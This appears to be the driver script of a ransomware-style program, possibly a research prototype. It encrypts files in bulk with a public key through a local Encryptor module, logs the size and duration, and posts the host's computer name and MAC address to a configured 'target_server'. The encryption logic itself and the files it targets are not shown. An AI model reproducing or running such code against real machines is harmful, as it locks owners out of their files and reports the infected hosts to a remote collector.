import sys
sys.path.append("./lib/")
from encryptor import Encryptor

from time import time
from datetime import datetime

import json
import requests
import platform
import socket
import os
import uuid

def postRequest(url,body):
    try:
        r = requests.post(url,json=body)
        r.raise_for_status()
    except requests.exceptions.HTTPError as err:
        raise SystemExit(err)
    return r

def getCompName():
    try:
        n1 = platform.node()
    except:
        n1 = ''
    try:
        n2 = socket.gethostname()
    except:
        n2 = ''
    try:
        n3 = os.environ["COMPUTERNAME"]
    except:
        n3 = ''
    if n1 == n2 == n3:
        return n1
    elif n1 == n2:
        return n1
    elif n1 == n3:
        return n1
    elif n2 == n3:
        return n2
    else:
        raise SystemExit("Computernames are not equal to each other")

def getMacAddress():
    return ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
######################################

if sys.platform == "linux" or sys.platform =="linux2":
    folder = "key/"
else:
    folder = "key\\"

#Record Start Time
start = time()
print("Start process on "+ str(datetime.now().time()))

if sys.platform == "linux" or sys.platform =="linux2":
    e = Encryptor("lib/config.json")
else:
    e = Encryptor("lib\\config.json")
size = e.encryptFiles(folder+'pubkey1.der')

#Record End time
end = time()
print("End process on "+ str(datetime.now().time()))
print("")
print("Total Size : " + str(size) + " bytes")
print("time elapsed: "+ str(end-start) + " seconds")

#Record Time Duration to file
with open("time.log", "a") as logFile:
    logFile.write("[ENCRYPT] : "+ str(size) +" bytes  | "+ str(end-start) + " seconds\n")

#Send log to server
try:
    config = json.load(open('lib/config.json',"rb"))
    url = config['target_server']+'log'
    body={'type':'encrypt','duration':str(end-start),'size': str(size),'compName':getCompName(),'macAddr': getMacAddress()}
    result = postRequest(url,body)
    print("Send log success")
except:
    print("Failed to send log")
